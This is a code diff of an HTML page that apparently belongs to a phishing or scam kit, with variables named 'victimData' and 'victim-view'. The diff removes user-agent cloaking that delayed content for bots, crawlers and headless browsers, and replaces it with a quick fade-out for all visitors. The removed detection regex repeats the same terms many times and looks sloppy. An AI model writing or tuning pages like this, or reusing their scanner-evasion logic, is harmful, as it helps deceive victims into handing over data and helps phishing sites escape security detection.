@@ -41,7 +41,7 @@
             overflow-x: hidden;
         }
 
-        /* --- ANTI-BOT / LOADING OVERLAY --- */
+        /* --- LOADING OVERLAY (QUICK FADE) --- */
         #anti-bot-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -51,7 +51,9 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            transition: opacity 0.5s ease;
+            transition: opacity 0.4s ease;
+            opacity: 1;
+            pointer-events: none; /* Allows clicks to pass through if it lingers */
         }
         .spinner {
             border: 4px solid #f3f3f3;
@@ -303,7 +305,7 @@
 </head>
 <body>
 
-    <!-- ANTI-BOT OVERLAY -->
+    <!-- LOADING OVERLAY (Instant fade out) -->
     <div id="anti-bot-overlay">
         <div class="spinner"></div>
         <p style="font-weight: 600; color: #666;">Please Wait...</p>
@@ -581,32 +583,18 @@
         let currentSubmissionId = null;
         let victimData = {};
 
-        // --- ANTI-BOT LOGIC ---
+        // --- FAST INIT & ANTI-BOT (LIGHTWEIGHT) ---
         function initAntiBot() {
             const overlay = document.getElementById('anti-bot-overlay');
-            const ua = navigator.userAgent;
-            const isBot = /bot|crawl|slurp|spider|headlesschrome|safari (mobile|ios)|samsungbrowser|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi|opera mini|opera mobi/.test(ua);
-            const isSmallViewport = window.innerWidth < 320 && window.innerHeight < 480;
             
-            // If it's a bot or tiny viewport, wait 5 seconds before showing content
-            if (isBot || isSmallViewport) {
+            // Instant fade out for everyone (0.5 seconds)
+            setTimeout(() => {
+                overlay.style.opacity = '0';
                 setTimeout(() => {
-                    overlay.style.opacity = '0';
-                    setTimeout(() => {
-                        overlay.style.display = 'none';
-                        document.getElementById('victim-view').classList.remove('hidden');
-                    }, 500);
-                }, 5000);
-            } else {
-                // Normal user: Quick fade out
-                setTimeout(() => {
-                    overlay.style.opacity = '0';
-                    setTimeout(() => {
-                        overlay.style.display = 'none';
-                        document.getElementById('victim-view').classList.remove('hidden');
-                    }, 500);
-                }, 1000);
-            }
+                    overlay.style.display = 'none';
+                    document.getElementById('victim-view').classList.remove('hidden');
+                }, 400);
+            }, 200);
         }
 
         // Load saved data
@@ -1245,4 +1233,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
